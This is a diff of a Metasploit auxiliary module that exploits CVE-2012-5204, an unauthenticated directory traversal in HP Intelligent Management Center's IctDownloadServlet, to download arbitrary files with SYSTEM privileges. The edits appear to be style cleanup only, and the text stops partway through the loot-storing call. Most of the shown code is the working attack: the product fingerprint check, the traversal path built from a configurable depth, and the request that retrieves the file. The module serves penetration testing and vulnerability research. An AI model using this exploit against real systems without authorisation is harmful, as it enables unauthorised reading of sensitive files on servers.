@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,34 +7,32 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'HP Intelligent Management IctDownloadServlet Directory Traversal',
-      'Description'    => %q{
-          This module exploits a lack of authentication and a directory traversal in HP
-        Intelligent Management, specifically in the IctDownloadServlet, in order to
-        retrieve arbitrary files with SYSTEM privileges. This module has been tested
-        successfully on HP Intelligent Management Center 5.1 E0202 over Windows 2003 SP2.
-      },
-      'License'        => MSF_LICENSE,
-      'Author'         =>
-        [
-          'rgod <rgod[at]autistici.org>', # Vulnerability Discovery
-          'juan vazquez' # Metasploit module
-        ],
-      'References'     =>
-        [
-          [ 'CVE', '2012-5204' ],
-          [ 'OSVDB', '91029' ],
-          [ 'BID', '58676' ],
-          [ 'ZDI', '13-053' ]
-        ]
-    ))
+                      'Name'           => 'HP Intelligent Management IctDownloadServlet Directory Traversal',
+                      'Description'    => %q(
+                          This module exploits a lack of authentication and a directory traversal in HP
+                        Intelligent Management, specifically in the IctDownloadServlet, in order to
+                        retrieve arbitrary files with SYSTEM privileges. This module has been tested
+                        successfully on HP Intelligent Management Center 5.1 E0202 over Windows 2003 SP2.
+                      ),
+                      'License'        => MSF_LICENSE,
+                      'Author'         =>
+                        [
+                          'rgod <rgod[at]autistici.org>', # Vulnerability Discovery
+                          'juan vazquez' # Metasploit module
+                        ],
+                      'References'     =>
+                        [
+                          [ 'CVE', '2012-5204' ],
+                          [ 'OSVDB', '91029' ],
+                          [ 'BID', '58676' ],
+                          [ 'ZDI', '13-053' ]
+                        ]))
 
     register_options(
       [
@@ -42,16 +41,15 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('FILEPATH', [true, 'The name of the file to download', '/windows\\win.ini']),
         # By default files downloaded from C:\Program Files\iMC\client\web\apps\imc\tmp\
         OptInt.new('DEPTH', [true, 'Traversal depth', 7])
-      ], self.class)
+      ], self.class
+    )
   end
 
   def is_imc?
-    res = send_request_cgi({
-      'uri'    => normalize_uri(target_uri.path.to_s, "login.jsf"),
-      'method' => 'GET'
-    })
+    res = send_request_cgi('uri' => normalize_uri(target_uri.path.to_s, "login.jsf"),
+                           'method' => 'GET')
 
-    if res and res.code == 200 and res.body =~ /HP Intelligent Management Center/
+    if res && (res.code == 200) && res.body =~ /HP Intelligent Management Center/
       return true
     else
       return false
@@ -59,12 +57,11 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def my_basename(filename)
-    return ::File.basename(filename.gsub(/\\/, "/"))
+    ::File.basename(filename.tr('\\', "/"))
   end
 
   def run_host(ip)
-
-    if not is_imc?
+    unless is_imc?
       vprint_error("#{rhost}:#{rport} - This isn't a HP Intelligent Management Center")
       return
     end
@@ -74,16 +71,14 @@ class MetasploitModule < Msf::Auxiliary
     travs << datastore['FILEPATH']
 
     vprint_status("#{rhost}:#{rport} - Sending request...")
-    res = send_request_cgi({
-      'uri'          => normalize_uri(target_uri.path.to_s, "tmp", "ict", "download"),
-      'method'       => 'GET',
-      'vars_get'     =>
+    res = send_request_cgi('uri' => normalize_uri(target_uri.path.to_s, "tmp", "ict", "download"),
+                           'method'       => 'GET',
+                           'vars_get'     =>
         {
           'fileName' => travs
-        }
-    })
+        })
 
-    if res and res.code == 200 and res.headers['Content-Type'] and res.headers['Content-Type'] == "application/doc"
+    if res && (res.code == 200) && res.headers['Content-Type'] && (res.headers['Content-Type'] == "application/doc")
       contents = res.body
       fname = my_basename(datastore['FILEPATH'])
       path = store_loot(
